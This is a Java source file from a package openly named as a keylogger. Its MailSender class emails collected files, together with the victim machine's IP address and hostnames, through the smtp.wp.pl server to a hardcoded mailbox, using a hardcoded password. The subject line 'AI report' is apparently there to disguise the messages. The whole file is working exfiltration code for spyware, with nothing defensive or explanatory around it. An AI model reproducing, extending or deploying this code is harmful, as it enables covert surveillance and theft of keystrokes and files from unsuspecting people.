package com.mossad.keylogger.mail;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.time.LocalDateTime;
import java.util.List;
import java.util.logging.Logger;

import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

public final class MailSender {

    private final Logger LOG = Logger.getLogger(MailSender.class.getCanonicalName());
    private final String MAIL_HOST_NAME = "smtp.wp.pl";
    private final String FROM = "kisonar@wp.pl";
    private final String PASSWORD = "sonar";
    private EmailAttachment attachment;
    private MultiPartEmail email;

    public MailSender() {
    }

    public void prepareEmailWithAtatchment(List<String> files) throws EmailException {
        email = prepareEmail();
        files.forEach(file -> {
            attachment = prepareEmailAttachment(file);
            try {
                email.attach(attachment);
            } catch (EmailException e) {
                LOG.warning(String.format("Cannot add attachment due to: %s", e.getMessage()));
            }
        });
    }

    public void send() throws EmailException {
        email.send();
    }

    private MultiPartEmail prepareEmail() throws EmailException {
        email = new MultiPartEmail();
        email.setHostName(MAIL_HOST_NAME);
        email.addTo(FROM);
        email.setFrom(FROM);
        email.setSubject("AI report: " + LocalDateTime.now());
        email.setMsg(resolveHostName());
        email.setSmtpPort(465);
        email.setSSLOnConnect(true);
        email.setSSLCheckServerIdentity(true);
        email.setBounceAddress(FROM);
        email.setAuthentication(FROM, PASSWORD);
        return email;
    }

    private EmailAttachment prepareEmailAttachment(String filePath) {
        attachment = new EmailAttachment();
        attachment.setPath(filePath);
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        return attachment;
    }

    private String resolveHostName() {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            stringBuilder.append(InetAddress.getLocalHost().getHostAddress());
            stringBuilder.append("\n");
            stringBuilder.append(InetAddress.getLocalHost().getHostName());
            stringBuilder.append("\n");
            stringBuilder.append(InetAddress.getLocalHost().getCanonicalHostName());
            stringBuilder.append("\n");
            stringBuilder.append(InetAddress.getLocalHost().toString());
        } catch (UnknownHostException e) {
            stringBuilder.append(String.format("\n Host determination fucked up due to: %s", e.getMessage()));
        }
        return stringBuilder.toString();
    }
}
